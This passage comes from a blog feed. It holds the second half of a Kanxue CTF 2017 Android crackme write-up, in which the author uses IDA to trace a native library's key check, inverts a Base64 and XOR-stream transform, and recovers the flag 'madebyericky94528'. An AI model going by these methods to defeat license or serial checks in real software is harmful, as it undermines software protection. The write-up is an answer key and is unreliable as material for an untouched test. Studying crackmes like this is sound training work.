<h2 id="关键点跟踪2"><a href="#关键点跟踪2" class="headerlink" title="关键点跟踪2"></a>关键点跟踪2</h2><p>然后接着调试跟踪。</p>
<p>接着上面，后续会接着向该段内存填充字符（非直接填充，还有个段算法，根据初始话的0x20的值来做的），我没有仔细跟踪算法了，通过对些内存关键点下断，然后跳出循环位置下断，下面0000357A就是循环位置，如此多次之后，循环结束。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00003576 000 B4 F1 FF 3F                                   CMP.W           R4, #0xFFFFFFFF</span><br><span class="line">.text:0000357A 000 3F F7 74 AD                                   BGT.W           loc_3066</span><br></pre></td></tr></table></figure></p>
<p>查看该内存数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5F019020 4A 00 79 00 75 00 33 00  43 00 4A 00 6C 00 56 00  J.y.u.3.C.J.l.V.</span><br><span class="line">5F019030 44 00 53 00 47 00 51 00  21 00 0A 00 00 00 00 00  D.S.G.Q.!.......</span><br></pre></td></tr></table></figure></p>
<p>接着跳过一段花之后，调用了bl sub_19FC，跟入，发现结果和刚才那段基本一直，也是将字符写入内存，并且内存就是刚才那段，只是每次都有一个1偏移。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0000364A 000 FE F7 D7 F9                                   BL              sub_19FC</span><br><span class="line">...</span><br><span class="line">librf_chen.so:5EFFB52E                 ORR.W           R3, LR, R2,LSL#1</span><br><span class="line">librf_chen.so:5EFFB532                 LDRB.W          R0, [R8,R5,LSL#1]</span><br><span class="line">librf_chen.so:5EFFB536                 ADDS            R2, #1</span><br><span class="line">librf_chen.so:5EFFB538                 STRB.W          R0, [R12,R3] ；也是前面的位置，但是加了个1偏移</span><br></pre></td></tr></table></figure></p>
<p>同样，结束之后，查看内存，通过后面分析，知道这段字符就是key加密变换之后要对比的字符串。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5ED12020  4A 50 79 6A 75 70 33 65  43 79 4A 6A 6C 6B 56 36  JPyjup3eCyJjlkV6</span><br><span class="line">5ED12030  44 6D 53 6D 47 48 51 3D  21 21 0A 0A 00 00 00 00  DmSmGHQ=!!......</span><br></pre></td></tr></table></figure>
<p>子过程返回之后，接着b进入另一段。调了这么久，我们输入的key去哪里了？下面来了！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">text:00003680 000 D9 F8 00 00                                   LDR.W           R0, [R9] 之前传入的参_JNIEnv</span><br><span class="line">.text:00003684 000 41 46                                         MOV             R1, R8 之前传入的参数，_jclass</span><br><span class="line">.text:00003686 000 00 22                                         MOVS            R2, #0</span><br><span class="line">.text:00003688 000 00 24                                         MOVS            R4, #0</span><br><span class="line">.text:0000368A 000 D0 F8 A4 32                                   LDR.W           R3, [R0,#0x2A4] libdvm.so:_Z20dvmDecodeIndirectRefP6ThreadP8_jobject+F55</span><br><span class="line">.text:0000368E 000 48 46                                         MOV             R0, R9 this指针</span><br><span class="line">.text:00003690 000 98 47                                         BLX             R3 libdvm.so:_Z20dvmDecodeIndirectRefP6ThreadP8_jobject+F55，返回输入的key的内存</span><br></pre></td></tr></table></figure>
<p>先来看看check接口:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check(_JNIEnv *,_jclass *,_jstring *) 00002814</span><br></pre></td></tr></table></figure></p>
<p>check参数在刚进入就被保存了，现在在00003680位置取出来，返回了我们输入的key到R0中（看注释）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5DC4BEC0  31 32 33 34 35 36 00 40  10 00 00 00 4B 00 00 00  123456.@....K...</span><br></pre></td></tr></table></figure>
<p>然后，又调用了一个子过程来处理key，我这里先没有跟入，直解F8，看了返回值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00003792 000 16 F0 09 FB                                   BL              sub_19DA8</span><br><span class="line">.text:00003796 000 01 46                                         MOV             R1, R0  ; key</span><br><span class="line">.text:00003798 000 DF F8 A4 04                                   LDR.W           R0, =(unk_20020 - 0x38D2)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">65 4B 2F 30 36 38 71 52  00 00 00 00 C0 BE C4 5D  eK/068qR</span><br></pre></td></tr></table></figure>
<p>基本确认是加密函数，然后又把该结果和JPyjup3eCyJjlkV6DmSmGHQ=!!进行对比。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:000038CE 000 78 44                                         ADD             R0, PC ; 保存了JPyjup3eCyJjlkV6DmSmGHQ=!!</span><br><span class="line">.text:000038D0</span><br><span class="line">.text:000038D0                                   AGAIN_18                                ; CODE XREF: sub_2874+10D</span><br><span class="line">.text:000038D0 000 0A 5D                                         LDRB            R2, [R1,R4]；R1保存了eK/068qR 取出一个字符</span><br><span class="line">.text:000038D2 000 03 5D                                         LDRB            R3, [R0,R4]；取出一个字符</span><br><span class="line">.text:000038D4 000 93 42                                         CMP             R3, R2</span><br><span class="line">.text:000038D6 000 40 F0 6B 80                                   BNE.W           loc_39B0 ; jmp 3A1A</span><br><span class="line">.text:000038DA 000 01 34                                         ADDS            R4, #1</span><br><span class="line"></span><br><span class="line">.text:00003942 000 18 2C                                         CMP             R4, #0x18</span><br><span class="line">.text:00003944 000 C4 D1                                         BNE             AGAIN_18</span><br><span class="line"></span><br><span class="line">.text:000039AC 000 01 20                                         MOVS            R0, #1</span><br><span class="line">.text:000039AE 000 3B E1                                         B               loc_3C28</span><br><span class="line"></span><br><span class="line">.text:00003A86 000 00 28                                         CMP             R0, #0</span><br><span class="line">.text:00003A88 000 00 F0 67 80                                   BEQ.W           TAG_FAILED</span><br><span class="line">.text:00003C26 000 00 20                                         MOVS            R0, #0</span><br></pre></td></tr></table></figure>
<p>取出一个字符进行比较，不同则跳转，相同R4加1，继续比价直到超过0x18（也就是加密结果长度0x18），都相同了R0=1</p>
<p>看看不同时跳转的代码，sub_27C8是一个类似鱼strstr的代码，我本以为加密之后结果可以部分匹配也行，结果我错了，作者坑人，因为这个sub_27C8就算返回1，也就是部分匹配成功了，也会进入00003C26，R0=0。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00003A1A 000 78 44                                         ADD             R0, PC  ; result</span><br><span class="line">.text:00003A1C 000 FE F7 D4 FE                                   BL              sub_27C8 ; 在result中找key，找到匹配的一段，返回匹配位置，否则返回0</span><br></pre></td></tr></table></figure></p>
<p>所以加密结果必须是0x18，和JPyjup3eCyJjlkV6DmSmGHQ=!!完全匹配(0x18字节)</p>
<h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><p>现在重新跟入加密子过程sub_19DA8，看看是怎么个算法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:00019DA8                                   sub_19DA8                      ; CODE XREF: sub_2874+F1E</span><br><span class="line">.text:00019DA8</span><br><span class="line">.text:00019DA8                                   var_10          = -0x10</span><br><span class="line">.text:00019DA8</span><br><span class="line">.text:00019DA8 000 2D E9 F0 43                                   PUSH.W          &#123;R4-R9,LR&#125;</span><br><span class="line">.text:00019DAC 01C 03 AF                                         ADD             R7, SP, #0xC</span><br><span class="line">.text:00019DAE 01C AD F5 81 6D                                   SUB.W           SP, SP, #0x408</span><br><span class="line">.text:00019DB2 424 81 B0                                         SUB             SP, SP, #4</span><br><span class="line">.text:00019DB4 428 81 46                                         MOV             R9, R0</span><br><span class="line">.text:00019DB6 428 DF F8 5C 05                                   LDR.W           R0, =(__stack_chk_guard_ptr - 0x19DBE)</span><br><span class="line">.text:00019DBA 428 78 44                                         ADD             R0, PC ; __stack_chk_guard_ptr</span><br><span class="line">.text:00019DBC 428 00 68                                         LDR             R0, [R0] ; __stack_chk_guard</span><br><span class="line">.text:00019DBE 428 00 68                                         LDR             R0, [R0]</span><br><span class="line">.text:00019DC0 428 47 F8 10 0C                                   STR.W           R0, [R7,#var_10]</span><br><span class="line">.text:00019DC4 428 00 F0 AA FA                                   BL              sub_1A31C ;</span><br><span class="line">.text:00019DC4                                                                           ; 返回199319124851!</span><br><span class="line">.text:00019DC8 428 80 46                                         MOV             R8, R0</span><br><span class="line">.text:00019DCA 428 48 46                                         MOV             R0, R9</span><br></pre></td></tr></table></figure>
<p>先通过sub_1A31C子函数返回了一串字符199319124851!，算法和生成JPyjup3eCyJjlkV6DmSmGHQ=!!字符类似，不再细说。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:00019F80 428 20 46                                         MOV             R0, R4  ; size</span><br><span class="line">.text:00019F82 428 E7 F7 14 EC                                   BLX             malloc //分配内存来保存第一次加密结果</span><br><span class="line">.text:00019F86 428 21 46                                         MOV             R1, R4</span><br><span class="line">.text:00019F88 428 05 46                                         MOV             R5, R0</span><br><span class="line">text:00019FF0 428 E7 F7 E2 EB                                   BLX             __aeabi_memclr；清零</span><br><span class="line">.text:00019FF4 428 6C 46                                         MOV             R4, SP</span><br><span class="line">.text:00019FF6 428 08 21                                         MOVS            R1, #8  ; a2</span><br><span class="line">.text:00019FF8 428 20 46                                         MOV             R0, R4  ; result</span><br><span class="line">.text:00019FFA 428 42 46                                         MOV             R2, R8  ; str</span><br><span class="line"></span><br><span class="line">.text:0001A0C8 428 EB F7 8C FA                                   BL              sub_55E4 ; str = &quot;199310124851!&quot;</span><br><span class="line">.text:0001A0C8                                                                           ; a2 长度+2</span><br><span class="line">.text:0001A0CC 428 20 46                                         MOV             R0, R4  ; p</span><br><span class="line">.text:0001A0CE 428 31 46                                         MOV             R1, R6  ; key_len</span><br><span class="line">.text:0001A0D0 428 4A 46                                         MOV             R2, R9  ; key</span><br><span class="line">.text:0001A0D2 428 2B 46                                         MOV             R3, R5  ; pKeyResult</span><br></pre></td></tr></table></figure>
<p>然后分配了一段内存，用于保存第一次加密的key结果。<br>调用sub_55E4，将199310124851!通过变换放入一个8字节+0x100*4的数组(初始化为0-0x100)空间,挺绕的，由于这个函数跟key没有多大关系，所以咩必要细究是怎么做的，可以直接将计算后内存dump出来用后面的逆运算（其实我没用上）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0001A13A 428 EA F7 A0 FA                                   BL              sub_467E;第一次加密变换</span><br><span class="line">.text:0001A13E 428 28 46                                         MOV             R0, R5</span><br></pre></td></tr></table></figure>
<p>然后sub_467E进行第一次加密变换，将key和前面的8字节+0x100*4的数组组队的xor，细节直接看代码(完整的我会放idb)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">v4 = p-&gt;unk_0;</span><br><span class="line">  v5 = p-&gt;unk_4;</span><br><span class="line">  if ( key_len &gt;&gt; 3 )                           // 8 &gt;&gt; 3 = 1</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = -(key_len &gt;&gt; 3);                       // -2</span><br><span class="line">    v7 = pKeyResult + 8 * (key_len &gt;&gt; 3);       // 2*8</span><br><span class="line">    key1 = key;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      ++v6;</span><br><span class="line">      v9 = (unsigned __int8)(v4 + 1);           // 1</span><br><span class="line">      v10 = p-&gt;index[v9];                       // p-&gt;Index[1]</span><br><span class="line">      v11 = v5 + v10;                           // 0+p-&gt;Index[1]</span><br><span class="line">      v12 = p-&gt;index[v11];</span><br><span class="line">      p-&gt;index[v9] = v12;</span><br><span class="line">      p-&gt;index[v11] = v10;</span><br><span class="line">      *(_BYTE *)pKeyResult = p-&gt;index[(unsigned __int8)(v10 + v12)] ^ *(_BYTE *)key1;</span><br><span class="line">      v13 = (unsigned __int8)(v4 + 2);          // 2</span><br><span class="line">      v14 = p-&gt;index[v13];                      // p-&gt;Index[2]</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></p>
<p>这里我没有暂时没有渗入理解，直接进入第二次加密运算。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0001A222 428 01 44                                         ADD             R1, R0 ；长度</span><br><span class="line">.text:0001A224 428 28 46                                         MOV             R0, R5 ；第一次加密结果</span><br><span class="line">.text:0001A226 428 EB F7 69 FC                                   BL              sub_5AFC ;第二次加密</span><br><span class="line">.text:0001A22A 428 3B 49                                         LDR             R1, =(__stack_chk_guard_ptr - 0x1A300)</span><br></pre></td></tr></table></figure>
<p>进入sub_5AFC，将key每3个字节一组，进行<code>&lt;&lt;8</code>拼接，也就是<code>a1&lt;&lt;16+a2&lt;&lt;8+a3</code>，举个例子<code>0xaa,0xbb,0xcc=&gt;0xaabbcc</code></p>
<p>然后拼接结果v15再左移，<br>如果是3个字符拼接的，这里v16是3，<code>v19=v15 &lt;&lt; 8 * (3 - v16)</code>也就左移0，也就是不左移;<br>如果是两个字符或者一个字符拼接的，这里就需要左移8或者16位，说白了就是需要构成0x112233的结构。</p>
<p>然后v19进行4次移位，取aAbcdefghijklmn字符放入结果内存中。其实就是v19按6位进行分割（分别右移0x12,0xc,0x6,0x0，&amp;03f），分割的值作为index，去aAbcdefghijklmn中对应字符，保存。<br>如果<code>v16&lt;3</code>，也就是此次拼接没有3个字符，这里<code>index=0x40</code>，也就是增加额外的”=”用于结果。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">if ( _R10 &gt; 0 )                               // len&gt;0</span><br><span class="line">  &#123;</span><br><span class="line">    i = 0;</span><br><span class="line">    p1 = p;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      if ( i &gt;= _R10 )</span><br><span class="line">      &#123;</span><br><span class="line">        v16 = 0;</span><br><span class="line">        v15 = 0;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        ii = 0;</span><br><span class="line">        v15 = 0;</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">          v15 = *(_BYTE *)(key + i + ii) | (v15 &lt;&lt; 8);// </span><br><span class="line">                                                // v15 = key[i] | 0&lt;&lt;8</span><br><span class="line">                                                // v15 = key[i+1] | v15&lt;&lt;8</span><br><span class="line">						// v15 = key[i+1] | v15&lt;&lt;8</span><br><span class="line">          v16 = ii + 1;</span><br><span class="line">          if ( ii + 1 &gt; 2 )                     // 0, 1</span><br><span class="line">            break;</span><br><span class="line">          v17 = i + ii++;</span><br><span class="line">        &#125;</span><br><span class="line">        while ( v17 + 1 &lt; _R10 );</span><br><span class="line">        i += v16;                               // v16 = 1, 2, 3</span><br><span class="line">                                                // i += v16, 下次计算使用的i</span><br><span class="line">      &#125;</span><br><span class="line">      j = 0;</span><br><span class="line">      v19 = v15 &lt;&lt; 8 * (3 - v16);</span><br><span class="line">      v20 = 0x12;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v16 &lt; j )</span><br><span class="line">          index = 0x40;</span><br><span class="line">        else</span><br><span class="line">          index = (v19 &gt;&gt; v20) &amp; 0x3F;</span><br><span class="line">        v20 -= 6;</span><br><span class="line">        *((_BYTE *)p1 + j++) = aAbcdefghijklmn[index];</span><br><span class="line">      &#125;</span><br><span class="line">      while ( j != 4 );                         // 每4字节</span><br><span class="line">      p1 = (char *)p1 + 4;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( i &lt; _R10 );</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h1 id="逆向算法"><a href="#逆向算法" class="headerlink" title="逆向算法"></a>逆向算法</h1><p>算法大致明白了，结果又是JPyjup3eCyJjlkV6DmSmGHQ=（取了0x18字节）。那么将第二次加密进行求逆。<br>先找JPyjup3eCyJjlkV6DmSmGHQ=每字节在’ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=’中的index。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">k = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&apos;</span><br><span class="line">r = &apos;JPyjup3eCyJjlkV6DmSmGHQ=&apos; #//!!&apos;</span><br><span class="line">idd = []</span><br><span class="line">def get_index_in_k(c):</span><br><span class="line">    for i in range(0, len(k)):</span><br><span class="line">        c1 = k[i:i+1]</span><br><span class="line">        if c1 == c:</span><br><span class="line">            return i</span><br><span class="line">    return -1</span><br><span class="line">            </span><br><span class="line">def cc():</span><br><span class="line">    j = 0</span><br><span class="line">    for i in range(0, len(r)):</span><br><span class="line">        c1 = r[i: i+1]</span><br><span class="line">        index = get_index_in_k(c1)</span><br><span class="line">        idd.append(index) #保存序号</span><br><span class="line">        print &apos;%d: %c %d %x&apos; % (i+1, c1, index, index )</span><br></pre></td></tr></table></figure>
<p>结果是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1: J 9 9</span><br><span class="line">2: P 15 f</span><br><span class="line">3: y 50 32</span><br><span class="line">4: j 35 23</span><br><span class="line">5: u 46 2e</span><br><span class="line">6: p 41 29</span><br><span class="line">7: 3 55 37</span><br><span class="line">8: e 30 1e</span><br><span class="line">9: C 2 2</span><br><span class="line">10: y 50 32</span><br><span class="line">11: J 9 9</span><br><span class="line">12: j 35 23</span><br><span class="line">13: l 37 25</span><br><span class="line">14: k 36 24</span><br><span class="line">15: V 21 15</span><br><span class="line">16: 6 58 3a</span><br><span class="line">17: D 3 3</span><br><span class="line">18: m 38 26</span><br><span class="line">19: S 18 12</span><br><span class="line">20: m 38 26</span><br><span class="line">21: G 6 6</span><br><span class="line">22: H 7 7</span><br><span class="line">23: Q 16 10</span><br><span class="line">24: = 64 40</span><br></pre></td></tr></table></figure></p>
<p>然后每4个index一组，来自于v19的4次右移，那么反过来4个一组，左移相加就是v19</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">for i in range(0, len(idd), 4):</span><br><span class="line">        a1 = idd[i] &lt;&lt; 0x12</span><br><span class="line">        a2 = idd[i+1] &lt;&lt; 0xc</span><br><span class="line">        a3 = idd[i+2] &lt;&lt; 0x6</span><br><span class="line">        a4 = 0</span><br><span class="line">        if idd[i+3] == 0x40:</span><br><span class="line">            a4 = 0</span><br><span class="line">        else:</span><br><span class="line">            a4 = idd[i+3] &lt;&lt; 0</span><br><span class="line">        a = a1+ a2+a3+a4</span><br><span class="line">        rrr.append(a)</span><br><span class="line">        print &apos;%d: %x&apos; % (i, a)</span><br></pre></td></tr></table></figure>
<p>得到结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0: 24fca3</span><br><span class="line">4: ba9dde</span><br><span class="line">8: b2263</span><br><span class="line">12: 96457a</span><br><span class="line">16: e64a6</span><br><span class="line">20: 1874</span><br></pre></td></tr></table></figure>
<p>然后我们又知道v19其实是v15拼接的，所以拆开就得到v15（第一次加密结果），可以看到key长度应该是17。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">24 fc a3 ba 9d de 0b 22 63 96 45 7a 0e 64 a6 18 74</span><br></pre></td></tr></table></figure></p>
<p>然后接着求第一次加密的逆运算，看代码，好多啊，怎么办，难道要求逆，好难！<br>好吧，不装了，其实不难，我们看前面说的第一次加密其实就是分组xor！<br>xor好啊，xor好啊…我们知道xor两次会将结果还原，想到了什么？！<br>是的，既然我们拿到第一次加密结果，那让他再和哪个8字节+0x100*4的数组再xor一次不久可以了，但是要重写这个加密代码貌似也挺麻烦的，怎么办？！</p>
<p>这里我是这么做的，在调试中，第一次加密前，将key的值（本来是输入）修改为上面得到的第一次加密结果，然后开始第一次加密运算，这样不就完美的完成了一次求逆吗，哈哈！</p>
<p>具体操作，对1A13A下断，输入key（必须是17位，否则修改内存时可能会挂），确认，断下来，此时r2就是key</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5E127B20  31 32 33 34 35 36 37 38  39 30 31 32 33 34 35 36  1234567890123456</span><br><span class="line">5E127B30  37 00 6D 5F 1B 00 00 00  00 00 00 00 00 00 00 00  7.m_............</span><br></pre></td></tr></table></figure>
<p>然后在hex窗口，f2修改内存，输入上面的24 fc…，然后f2确认修改。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5E127B20  24 FC A3 BA 9D DE 0B 22  63 96 45 7A 0E 64 A6 18  $.</span><br><span class="line">5E127B30  74 A9 12 5E 0F 00 1F 00  FF FF 1F 00 0F 00 00 t..^..</span><br></pre></td></tr></table></figure></p>
<p>然后f8。看看结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5E127B38  6D 61 64 65 62 79 65 72  69 63 6B 79 39 34 35 32  madebyericky9452</span><br><span class="line">5E127B48  38 00 73 00 11 10 00 00  62 00 69 00 6C 00 69 00  8.s.....b.i.l.i.</span><br></pre></td></tr></table></figure></p>
<p>答案就是：madebyericky94528</p>
<p>转载请注明出处：<a href="https://anhkgg.github.io/kxctf2017-writeup6">https://anhkgg.github.io/kxctf2017-writeup6</a></p>
<p>参考：</p>
<ol>
<li><a href="http://bbs.pediy.com/thread-217612.htm" target="_blank" rel="noopener">安卓APP动态调试技术–以IDA为例</a></li>
<li><a href="http://luleimi.blog.163.com/blog/static/175219645201210922139272/" target="_blank" rel="noopener">http://luleimi.blog.163.com/blog/static/175219645201210922139272/</a></li>
<li><a href="http://blog.csdn.net/zhangmiaoping23/article/details/43445797" target="_blank" rel="noopener">http://blog.csdn.net/zhangmiaoping23/article/details/43445797</a></li>
<li><a href="http://www.cnblogs.com/liujiahi/archive/2011/03/22/2196401.html" target="_blank" rel="noopener">http://www.cnblogs.com/liujiahi/archive/2011/03/22/2196401.html</a></li>
<li><a href="http://cncc.bingj.com/cache.aspx?q=arm++IT+EQ&amp;d=4981012666125942&amp;mkt=zh-CN&amp;setlang=zh-CN&amp;w=YEX3ioizXLDZGmlpVDBGFh_dhhHpfnYj" target="_blank" rel="noopener">http://cncc.bingj.com/cache.aspx?q=arm++IT+EQ&amp;d=4981012666125942&amp;mkt=zh-CN&amp;setlang=zh-CN&amp;w=YEX3ioizXLDZGmlpVDBGFh_dhhHpfnYj</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;题目入口：&lt;a href=&quot;http://ctf.pediy.com/game-fight-36.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://ctf.pediy.com/game-fight-36.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本题是安卓cm，目测肯定需要调试so。&lt;/p&gt;
&lt;p&gt;准备工具：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ApkIde改之理（其他类似的也行，能够反编译apk，得到jar,so等）&lt;/li&gt;
&lt;li&gt;IDA（用于调试so），需要6.x以上，忘了是x几，我用的6.6&lt;/li&gt;
&lt;li&gt;adb(ApkIde改之理就有)&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="ctf" scheme="https://anhkgg.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://anhkgg.github.io/tags/ctf/"/>
    
      <category term="writeup" scheme="https://anhkgg.github.io/tags/writeup/"/>
    
      <category term="看雪" scheme="https://anhkgg.github.io/tags/%E7%9C%8B%E9%9B%AA/"/>
    
      <category term="kanxue" scheme="https://anhkgg.github.io/tags/kanxue/"/>
    
      <category term="bbs.pediy.com" scheme="https://anhkgg.github.io/tags/bbs-pediy-com/"/>
    
      <category term="crackme" scheme="https://anhkgg.github.io/tags/crackme/"/>
    
      <category term="安卓" scheme="https://anhkgg.github.io/tags/%E5%AE%89%E5%8D%93/"/>
    
      <category term="apk" scheme="https://anhkgg.github.io/tags/apk/"/>
    
  </entry>
  
  <entry>
    <title>看雪CTF2017第五题 独行孤客CrackMe的writeup</title>
    <link href="https://anhkgg.github.io/kxctf2017-writeup5/"/>
    <id>https://anhkgg.github.io/kxctf2017-writeup5/</id>
    <published>2017-06-11T06:42:16.000Z</published>
    <updated>2017-06-17T00:18:16.200Z</updated>
    
    <content type="html"><![CDATA[<p>题目入口：<a href="http://ctf.pediy.com/game-fight-35.htm" target="_blank" rel="noopener">http://ctf.pediy.com/game-fight-35.htm</a>，可下载相关文件</p>
<blockquote>
<p>本题需要在XP系统运行，因为驱动只支持xp</p>
</blockquote>
